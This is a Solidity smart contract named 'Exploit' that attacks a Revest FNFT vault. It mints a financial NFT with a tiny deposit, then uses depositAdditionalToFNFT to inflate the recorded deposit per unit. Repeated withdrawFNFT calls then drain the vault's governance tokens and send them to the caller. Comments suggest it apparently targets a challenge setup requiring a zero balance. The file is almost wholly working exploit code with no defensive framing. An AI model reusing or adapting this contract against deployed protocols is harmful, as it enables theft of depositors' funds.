// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./OtherInterfaces.sol";

contract Exploit {
    IRevest private revest;

    constructor(address _revest) {
        revest = IRevest(_revest);
    }

    function shoot(
        address vault,
        address asset,
        uint256 quantityForMint, 
        uint256 depositAmountForMint,
        uint256 quantityForChange, 
        uint256 depositAmountForChange,
        uint256 quantityForWithdrawl
    ) private {
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = quantityForMint;
        bytes memory arguments;

        IRevest.FNFTConfig memory fnftConfig;
        fnftConfig.asset = asset;
        fnftConfig.depositAmount = depositAmountForMint;
        //transfer quantityForMint gov token to valut and mint quantityForMint nft to this
        uint256 fnftId = revest.mintAddressLock(
            address(this),
            arguments,
            recipients,
            quantities,
            fnftConfig
        );
        //change fnft.depositAmount to depositAmountForChange
        revest.depositAdditionalToFNFT(
            fnftId,
            depositAmountForChange,
            quantityForChange
        );    
        if (quantityForWithdrawl == 0) {
            require(depositAmountForMint ==1 && depositAmountForChange == 1, "N1");
            uint256 bal = IERC20(asset).balanceOf(vault);
            if (bal % 2 == 0) {
                quantityForWithdrawl = bal / (depositAmountForMint + depositAmountForChange);
            } else {
                IERC20(asset).transfer(vault, 1);
                quantityForWithdrawl = IERC20(asset).balanceOf(vault) / (depositAmountForMint + depositAmountForChange);
            }            
        }
        revest.withdrawFNFT(fnftId, quantityForWithdrawl);
    }

    function start(address _gov, address _vault) external {
        require(IERC20(_gov).balanceOf(address(this)) == 1e18, "transfer gov token");
        IERC20(_gov).approve(address(revest), type(uint256).max);

        shoot(
            _vault,
            _gov,
            1e17, 1,
            1, 1e17,
            1_000_001
        );
        //there is 99999999998999999(<0.01e18) left in vault now, attack should stop in real life.
        //but it requires 0 balance.
        shoot(
            _vault,
            _gov,
            1e17, 1,
            1, 1,
            0
        );
        
        IERC20(_gov).transfer(msg.sender, IERC20(_gov).balanceOf(address(this)));
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }
}